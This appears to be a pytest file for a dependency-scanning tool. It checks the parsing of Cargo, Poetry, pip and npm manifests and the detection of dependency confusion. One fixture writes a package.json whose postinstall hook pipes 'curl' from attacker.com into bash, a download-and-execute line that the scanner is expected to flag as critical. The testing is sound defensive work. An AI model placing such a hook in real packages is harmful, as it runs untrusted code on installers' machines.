"""
Unit tests for Dependency Intelligence Subsystem.
Tests:
- Cargo.toml & Cargo.lock
- pyproject.toml & poetry.lock
- package.json lifecycle scripts (preinstall, postinstall)
- package-lock.json
- Dependency confusion detection
- Structured evidence format matching specification
"""

import tempfile
from pathlib import Path
import pytest

from topochain.core.extractor.dependency_extractor import (
    DependencyExtractor,
    DependencyIntelligenceResult,
)


def test_cargo_toml_and_lock_parsing():
    extractor = DependencyExtractor()
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "Cargo.toml").write_text('''
[package]
name = "my-rust-crate"
version = "0.1.0"

[dependencies]
serde = "1.0"
tokio = { version = "1.28", features = ["full"] }

[dev-dependencies]
criterion = "0.4"
''')

        intel = extractor.analyze_directory(tmpdir)
        dep_names = {d.name for d in intel.dependencies}

        assert "serde" in dep_names
        assert "tokio" in dep_names
        assert "criterion" in dep_names
        assert "rust/cargo" in intel.ecosystems_detected


def test_poetry_lock_and_pyproject():
    extractor = DependencyExtractor()
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "poetry.lock").write_text('''
[[package]]
name = "cryptography"
version = "42.0.0"
description = "Cryptography library"

[[package]]
name = "fastapi"
version = "0.109.0"
description = "FastAPI framework"
''')

        intel = extractor.analyze_directory(tmpdir)
        dep_names = {d.name for d in intel.dependencies}

        assert "cryptography" in dep_names
        assert "fastapi" in dep_names
        assert "python/poetry" in intel.ecosystems_detected


def test_npm_lifecycle_script_analysis():
    extractor = DependencyExtractor()
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "package.json").write_text('''
{
  "name": "malicious-npm-package",
  "version": "1.0.0",
  "scripts": {
    "build": "tsc",
    "postinstall": "curl -s http://attacker.com/payload.sh | bash"
  },
  "dependencies": {
    "lodash": "^4.17.21"
  }
}
''')

        intel = extractor.analyze_directory(tmpdir)

        assert len(intel.lifecycle_scripts) >= 1
        script = intel.lifecycle_scripts[0]
        assert script["hook"] == "postinstall"
        assert script["is_suspicious"] is True
        assert intel.risk_score >= 0.70

        # Verify structured evidence contains lifecycle alert
        lifecycle_ev = [e for e in intel.evidence if "package.json#scripts" in e.dependency]
        assert len(lifecycle_ev) > 0
        assert lifecycle_ev[0].risk == "critical"


def test_dependency_confusion_detection():
    extractor = DependencyExtractor(internal_namespaces=["corp", "internal"])
    with tempfile.TemporaryDirectory() as tmpdir:
        td = Path(tmpdir)
        (td / "requirements.txt").write_text('''
corp-internal-auth==1.0.0
requests>=2.28.0
''')

        intel = extractor.analyze_directory(tmpdir)
        dep_map = {d.name: d for d in intel.dependencies}

        assert "corp-internal-auth" in dep_map
        flags = dep_map["corp-internal-auth"].suspicious_flags
        assert any("dependency_confusion" in f for f in flags)

        # Check structured evidence
        ev = [e for e in intel.evidence if e.dependency == "corp-internal-auth"]
        assert len(ev) > 0
        assert any("Unscoped internal naming pattern" in r for r in ev[0].reasons)
        ev_dict = ev[0].to_dict()
        assert "dependency" in ev_dict
        assert "change" in ev_dict
        assert "risk" in ev_dict
        assert "reasons" in ev_dict
